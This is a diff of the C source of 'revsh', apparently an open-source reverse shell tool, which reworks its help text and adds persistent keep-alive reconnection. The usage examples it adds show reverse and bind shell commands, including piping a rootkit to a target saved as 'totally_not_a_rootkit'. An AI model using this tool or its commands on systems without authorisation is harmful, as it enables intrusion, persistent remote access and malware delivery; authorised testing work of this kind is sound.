@@ -62,22 +62,13 @@ volatile sig_atomic_t sig_found = 0;
  **********************************************************************************************************************/
 
 // XXX
-// Fix -k keepalive for persistance after disconnect. Make target node try to connect back forever.
-// Remove -a switch. 
-// -e : ephemeral dh.
-//		Add check for #ifdef GENERIC_BUILD that sets default to ADH and prints a friendly error message if c2 invoked w/-e.
-// -v : handle multpiles for counter of verbosity.
-// -H : long usage (the old one). 
-// -h : simple usage (a new one).
-// -l : same thing as -c
-// -w : Disable default proxy.  (Just set config->socks to NULL.)
-// -x : Disable default tun.
-// -y : Disable default tap.
-
-// XXX
-// Make static binary default.
+// Implement all the switches listed in usage().
+// Comment the code.
 // Make a man page.
+// Make static binary default.
+// Test all the switches.
 // Test on freebsd.
+// Use daily til Toorcon.
 
 
 void usage(int ret_code){
@@ -87,49 +78,89 @@ void usage(int ret_code){
 		out_stream = stderr;
 	}
 
-#ifdef OPENSSL
-	fprintf(out_stream, "\nusage:\t%s\t[-c [-a] [-d KEYS_DIR] [-f RC_FILE] [-L [LHOST:]LPORT:RHOST:RPORT] [-D [LHOST:]LPORT]\n\t\t[-s SHELL] [-t SEC] [-r SEC1[,SEC2]] [-z LOG_FILE] [-b] [-n] [-k] [-v] [-h] [ADDRESS:PORT]\n", program_invocation_short_name);
-#else /* OPENSSL */
-	fprintf(out_stream, "\nusage:\t%s\t[-c [-f RC_FILE]] [-s SHELL] [-t SEC] [-r SEC1[,SEC2] [-z LOG_FILE] [-L [LHOST:]LPORT:RHOST:RPORT] [-D [LHOST:]LPORT]]\n\t\t[-b [-k]] [-n] [-v] [ADDRESS:PORT]\n", program_invocation_short_name);
-#endif /* OPENSSL */
-
-	fprintf(out_stream, "\n\t-c\t\tRun in command and control mode.\t\t(Default is target mode.)\n");
-#ifdef OPENSSL
-	fprintf(out_stream, "\t-a\t\tEnable Anonymous Diffie-Hellman mode.\t\t(Default is \"%s\".)\n", CONTROLLER_CIPHER);
+	fprintf(out_stream, "\nControl:\t%s -c [CONTROL_OPTIONS] [MUTUAL_OPTIONS] [ADDRESS:PORT]\n", program_invocation_short_name);
+	fprintf(out_stream, "Target:\t\t%s     [TARGET_OPTIONS] [MUTUAL_OPTIONS] [ADDRESS:PORT]\n", program_invocation_short_name);
+	fprintf(out_stream, "\nCONTROL_OPTIONS:\n");
+	fprintf(out_stream, "\t-c\t\tRun in \"command and control\" mode.\t\t(Default is target mode.)\n");
+#ifndef GENERIC_BUILD
+	fprintf(out_stream, "\t-a\t\tEnable Anonymous Diffie-Hellman mode.\t\t(Default is Ephemeral Diffie-Hellman.)\n");
+# ifdef OPENSSL
 	fprintf(out_stream, "\t-d KEYS_DIR\tReference the keys in an alternate directory.\t(Default is \"%s\".)\n", KEYS_DIR);
-#endif /* OPENSSL */
+# endif /* OPENSSL */
+#endif
 	fprintf(out_stream, "\t-f RC_FILE\tReference an alternate rc file.\t\t\t(Default is \"%s\".)\n", RC_FILE);
-	fprintf(out_stream, "\t-L\t\tLocal Forward:\n\t\t\tOpen a listening port locally on LHOST:LPORT.\n\t\t\tForward traffic to RHOST:RPORT.\n"); 
-	fprintf(out_stream, "\t-D\t\tDynamic Forward:\n\t\t\tOpen a listening port locally on LHOST:LPORT.\n\t\t\tForward traffic to RHOST:RPORT.\n"); 
 	fprintf(out_stream, "\t-s SHELL\tInvoke SHELL as the remote shell.\t\t(Default is \"%s\".)\n", DEFAULT_SHELL);
+#ifdef LOG_FILE
+	fprintf(out_stream, "\t-F LOG_FILE\tLog general use and errors to LOG_FILE.\t\t(Default is \"%s\".)\n", LOG_FILE);
+#else
+	fprintf(out_stream, "\t-F LOG_FILE\tLog general use and errors to LOG_FILE.\t\t(No default set.)\n");
+#endif
+
+	fprintf(out_stream, "\nTARGET_OPTIONS:\n");
 	fprintf(out_stream, "\t-t SEC\t\tSet the connection timeout to SEC seconds.\t(Default is \"%d\".)\n", TIMEOUT);
 	fprintf(out_stream, "\t-r SEC1,SEC2\tSet the retry time to be SEC1 seconds, or\t(Default is \"%s\".)\n\t\t\tto be random in the range from SEC1 to SEC2.\n", RETRY);
-#ifdef LOG_FILE
-	fprintf(out_stream, "\t-z LOG_FILE\tLog general use and errors to LOG_FILE.\t(Default is \"%s\".)\n", LOG_FILE);
-#else
-	fprintf(out_stream, "\t-z LOG_FILE\tLog general use and errors to LOG_FILE.\t(No default set.)\n");
-#endif
+	fprintf(out_stream, "\t-k\t\tRun in keep-alive mode.\n\t\t\tTarget will never seppuku.\n");
+
+	fprintf(out_stream, "\nMUTUAL_OPTIONS:\n");
+	fprintf(out_stream, "\t-L [LHOST:]LPORT:RHOST:RPORT\n");
+	fprintf(out_stream, "\t\t\tLocal forward connections from the local\n\t\t\tlistener at LHOST:LPORT to RHOST:RPORT.\n"); 
+	fprintf(out_stream, "\t-D [LHOST:]LPORT\n");
+	fprintf(out_stream, "\t\t\tDynamic forward connection from the local\n\t\t\tlistener at LHOST:LPORT.\t\t\t(Socks 4, 4a, and 5. TCP connect only.)\n");
+	fprintf(out_stream, "\t-x\t\tDisable the default proxy listener.\t\t(Default listener on port %s)\n", SOCKS_LISTENER);
+	fprintf(out_stream, "\t-y\t\tDisable the default tun device.\n");
+	fprintf(out_stream, "\t-z\t\tDisable the default tap device.\n");
 	fprintf(out_stream, "\t-b\t\tStart in bind shell mode.\t\t\t(Default is reverse shell mode.)\n");
-	fprintf(out_stream, "\t-k\t\tRun in keep-alive mode.\n\t\t\tOnly valid in bind shell mode.\n");
+	fprintf(out_stream, "\t\t\tThe -b flag must be invoked on both ends.\n");
 	fprintf(out_stream, "\t-n\t\tNon-interactive netcat style data broker.\t(Default is interactive w/remote tty.)\n\t\t\tNo tty. Useful for copying files.\n");
-	fprintf(out_stream, "\t-v\t\tVerbose output.\n");
+	fprintf(out_stream, "\t-v\t\tVerbose. -vv and -vvv increase verbosity.\n");
 	fprintf(out_stream, "\t-h\t\tPrint this help.\n");
-	fprintf(out_stream, "\tADDRESS:PORT\tThe address and port of the listening socket.\t(Default is \"%s\".)\n", ADDRESS);
-	fprintf(out_stream, "\n\tNotes:\n");
-	fprintf(out_stream, "\t\t* The -b flag must be invoked on both the control and target hosts to enable bind shell mode.\n");
-	fprintf(out_stream, "\t\t* Bind shell mode can also be enabled by invoking the binary as 'bindsh' instead of 'revsh'.\n");
-	fprintf(out_stream, "\t\t* Verbose output may mix with data if -v is used together with -n.\n");
-	fprintf(out_stream, "\n\tInteractive example:\n");
-	fprintf(out_stream, "\t\tlocal controller host:\trevsh -c 192.168.0.42:443\n");
-	fprintf(out_stream, "\t\tremote target host:\trevsh 192.168.0.42:443\n");
-	fprintf(out_stream, "\n\tNon-interactive example:\n");
-	fprintf(out_stream, "\t\tlocal controller host:\tcat ~/bin/rootkit | revsh -n -c 192.168.0.42:443\n");
-	fprintf(out_stream, "\t\tremote target host:\trevsh 192.168.0.42:443 > ./totally_not_a_rootkit\n");
+	fprintf(out_stream, "\t-e\t\tPrint out some usage examples.\n");
+
+	fprintf(out_stream, "\n\tADDRESS:PORT\tThe address and port of the listening socket.\t(Default is \"%s\".)\n", ADDRESS);
+
+#ifdef GENERIC_BUILD
+	fprintf(out_stream, "\n\tThis binary only allows Anonymous Diffie-Hellman. In order to enable Ephemeral Diffie-Hellman\n");
+	fprintf(out_stream, "\t(with Perfect Forward Secrecy) you will need your own copy built from source.\n");
+	fprintf(out_stream, "\tThe source is available at: https://github.com/emptymonkey/revsh\n");
+#endif
+
 	fprintf(out_stream, "\n\n");
 
 	exit(ret_code);
 }
 
+void examples(int ret_code){
+
+	FILE *out_stream = stdout;
+
+	if(ret_code){
+		out_stream = stderr;
+	}
+
+	fprintf(out_stream, "\n%s usage examples for:\n", program_invocation_short_name);
+	fprintf(out_stream, "\tcontrol host: 192.168.0.42\n");
+	fprintf(out_stream, "\ttarget host:  192.168.0.66\n");
+
+	fprintf(out_stream, "\nInteractive example:\n");
+	fprintf(out_stream, "\tcontrol:\trevsh -c 192.168.0.42:443\n");
+	fprintf(out_stream, "\ttarget:\t\trevsh 192.168.0.42:443\n");
+
+	fprintf(out_stream, "\nInteractive example with ADDRESS defined as 192.168.0.42:443 in config.h:\n");
+	fprintf(out_stream, "\tcontrol:\trevsh -c\n");
+	fprintf(out_stream, "\ttarget:\t\trevsh\n");
+
+	fprintf(out_stream, "\nBindshell example:\n");
+	fprintf(out_stream, "\ttarget:\t\trevsh -b 192.168.0.66:443\n");
+	fprintf(out_stream, "\tcontrol:\trevsh -c -b 192.168.0.66:443\n");
+
+	fprintf(out_stream, "\nNon-interactive file transfer example:\n");
+	fprintf(out_stream, "\tcontrol:\tcat ~/bin/rootkit | revsh -n -c 192.168.0.42:443\n");
+	fprintf(out_stream, "\ttarget:\t\trevsh 192.168.0.42:443 > ./totally_not_a_rootkit\n");
+
+	fprintf(out_stream, "\n\n");
+
+	exit(ret_code);
+}
 
 
 /***********************************************************************************************************************
@@ -214,11 +245,16 @@ int main(int argc, char **argv){
 	verbose = 0;
 
 #ifdef OPENSSL
-	io->fingerprint_type = NULL;
 
-	//config->encryption = EDH;
-	config->encryption = ADH;
+	io->fingerprint_type = NULL;
 	config->cipher_list = NULL;
+
+#	ifdef GENERIC_BUILD
+	config->encryption = ADH;
+#	else
+	config->encryption = EDH;
+#	endif
+
 #endif /* OPENSSL */
 
 
@@ -231,11 +267,15 @@ int main(int argc, char **argv){
 	}
 
 	/* Grab the configuration from the command line. */
-	while((opt = getopt(argc, argv, "hHpbkacs:d:f:L:R:D:r:z:t:nv")) != -1){
+	while((opt = getopt(argc, argv, "hepbkalcs:d:f:L:R:D:r:F:t:nv")) != -1){
 		switch(opt){
 
 			case 'h':
 				usage(0);
+				break;
+
+			case 'e':
+				examples(0);
 				break;
 
 			/*  The plaintext case is an undocumented "feature" which should be difficult to use. */
@@ -264,6 +304,7 @@ int main(int argc, char **argv){
 				config->keepalive = 1;
 				break;
 
+			case 'l':
 			case 'c':
 				io->controller = 1;
 				break;
@@ -302,7 +343,7 @@ int main(int argc, char **argv){
 				retry_string = optarg;
 				break;
 
-			case 'z':
+			case 'F':
 				config->log_file = optarg;
 				break;
 
@@ -313,6 +354,16 @@ int main(int argc, char **argv){
 
 			case 'n':
 				config->interactive = 0;
+				break;
+
+//XXX
+			case 'x':
+				break;
+
+			case 'y':
+				break;
+
+			case 'z':
 				break;
 
 			case 'v':
@@ -334,6 +385,11 @@ int main(int argc, char **argv){
 
 	if(!strncmp(tmp_ptr, "bindsh", 6)){
 		config->bindshell = 1;
+	}
+
+
+	if(config->keepalive){
+		config->timeout = 0;
 	}
 
 	/* Grab the ip address. */
@@ -435,7 +491,9 @@ int main(int argc, char **argv){
 			retval = do_control(config);
 		} while(retval != -1 && config->keepalive);
 	}else{
-		retval = do_target(config);
+		do{
+			retval = do_target(config);
+		} while(retval != -1 && config->keepalive);
 	}
 
 	return(retval);
